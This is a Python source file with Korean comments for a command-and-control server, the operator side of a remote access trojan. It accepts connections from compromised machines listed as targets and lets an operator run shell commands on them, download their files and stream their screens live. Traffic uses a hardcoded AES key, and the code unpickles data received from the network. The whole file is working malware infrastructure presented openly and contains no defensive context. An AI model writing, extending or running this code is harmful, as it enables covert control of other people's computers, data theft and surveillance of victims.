import socket
import threading
import base64
import os
import cv2
import pickle
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# 암호화 키와 IV (16바이트 고정)
KEY = b"your_16_byte_key"
IV = b"abcdefghijklmnop"

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))

def decrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size)

def receive_encrypted_data(conn):
    """암호화된 데이터를 수신 및 복호화"""
    # 데이터 크기 수신
    data_length = int.from_bytes(conn.recv(4), 'big')  # 데이터 크기 읽기

    # 데이터를 크기만큼 읽기
    data = b""
    while len(data) < data_length:
        packet = conn.recv(data_length - len(data))
        if not packet:
            raise ValueError("데이터가 손실되었습니다.")
        data += packet

    # 데이터 복호화
    return decrypt(data)

clients = {}
lock = threading.Lock()

def handle_client(conn, addr):
    """클라이언트 관리 및 리스트에 추가"""
    try:
        # 디바이스 ID 및 호스트 이름 수신
        encrypted_device_info = conn.recv(4096)
        device_info = decrypt(encrypted_device_info).decode("utf-8")
        device_id, hostname = device_info.split(":")

        with lock:
            clients[device_id] = {"connection": conn, "hostname": hostname, "ip": addr[0]}

        print(f"[+] Device Connected: {hostname} ({addr[0]})")

        # 지속적으로 클라이언트 연결 상태 확인
        while True:
            # 연결 확인용 간단한 ping 처리
            conn.send(encrypt("ping".encode("utf-8")))
            if not conn.recv(4096):  # 응답이 없으면 연결 종료 처리
                break

    except Exception as e:
        print(f"[-] Error with client {addr[0]}: {e}")

    finally:
        # 연결 종료 시 클라이언트 제거
        with lock:
            if device_id in clients:
                print(f"[-] Device Disconnected: {hostname} ({addr[0]})")
                del clients[device_id]
        conn.close()

def stream_screen():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_IP, STREAM_PORT))
    server_socket.listen(1)

    print(f"스트림 서버가 {SERVER_IP}:{STREAM_PORT}에서 시작되었습니다...")
    conn, addr = server_socket.accept()
    print(f"{addr}에서 스트림 연결됨. ['q' 를 눌러 스트림 종료]")

    try:
        while True:
            # 데이터 크기 수신
            data_size = int.from_bytes(conn.recv(4), 'big')
            
            # 데이터 수신
            data = b""
            while len(data) < data_size:
                packet = conn.recv(data_size - len(data))
                if not packet:
                    raise ValueError("데이터가 손실되었습니다.")
                data += packet
            
            # 데이터 역직렬화 및 디스플레이
            frame = pickle.loads(data)
            cv2.imshow("원격 화면", frame)
            
            if cv2.waitKey(1) == ord('q'):
                break
    except Exception as e:
        print(f"오류 발생: {e}")
    finally:
        conn.close()
        server_socket.close()
        cv2.destroyAllWindows()

def interact_with_client(device_id):
    with lock:
        client = clients.get(device_id)
        if not client:
            print(f"[-] Device {device_id} is not connected.")
            return
        conn = client["connection"]
        hostname = client["hostname"]

    current_directory = "."

    try:
        while True:
            command = input(f"Shell ({hostname}@{current_directory})> ")
            if command.lower() == "exit":
                conn.send(encrypt("exit".encode("utf-8")))
                break
            
            elif command.startswith("download "):
                file_name = command.split(" ", 1)[1]
                conn.send(encrypt(f"download {file_name}".encode("utf-8")))
                encrypted_result = conn.recv(4096)
                if not encrypted_result:
                    print("[-] No data received. Connection might be lost.")
                    break
                file_data = decrypt(encrypted_result)
                if file_name.endswith(".zip"):  # 디렉터리 압축 파일인지 확인
                    save_path = os.path.join(".", file_name)
                    with open(save_path, "wb") as f:
                        f.write(file_data)
                    print(f"[+] Directory {file_name} downloaded and saved as {save_path}")
                else:
                    with open(file_name, "wb") as f:
                        f.write(file_data)
                    print(f"[+] File {file_name} downloaded successfully.")

            elif command.lower() == "stream":
                conn.send(encrypt("stream".encode("utf-8")))
                stream_screen()

            else:
                conn.send(encrypt(command.encode("utf-8")))
                encrypted_result = conn.recv(4096)
                if not encrypted_result:
                    print("[-] No data received. Connection might be lost.")
                    break
                result = decrypt(encrypted_result).decode("utf-8", errors="replace")
                current_directory, command_output = result.split("\n", 1)
                print(command_output)

    except Exception as e:
        print(f"[-] Error: {e}")

def command_and_control(server_ip, server_port):
    """C&C 서버 실행"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((server_ip, server_port))
    server.listen(5)
    print(f"[+] Listening on {server_ip}:{server_port}")

    def accept_clients():
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.start()

    threading.Thread(target=accept_clients, daemon=True).start()

    while True:
        # os.system('cls' if os.name == 'nt' else 'clear')
        print("\nOptions:")
        print("[1] 연결")
        print("[2] Exit")

        choice = input("Choice: ")
        os.system('cls' if os.name == 'nt' else 'clear')

        if choice == "1":
            print("\n타겟 리스트:")
            device_list = []
            with lock:
                for i, (device_id, info) in enumerate(clients.items(), 1):
                    print(f"    {i}. {info['hostname']} ({info['ip']}) [ID: {device_id}]")
                    device_list.append(device_id)

            selection = input("\n연결할 번호 혹은 ID 입력: ")
            try:
                if selection.isdigit():
                    device_index = int(selection) - 1
                    if 0 <= device_index < len(device_list):
                        device_id = device_list[device_index]
                    else:
                        print("[-] 존재하지 않는 번호.")
                        continue
                else:
                    device_id = selection

                interact_with_client(device_id)
            except ValueError:
                print("[-] Invalid input. Please enter a number or device ID.")

        elif choice == "2":
            break
        else:
            print("[-] Invalid choice.")

if __name__ == "__main__":
    SERVER_IP = "0.0.0.0"
    SERVER_PORT = 1232
    STREAM_PORT = 5555
    command_and_control(SERVER_IP, SERVER_PORT)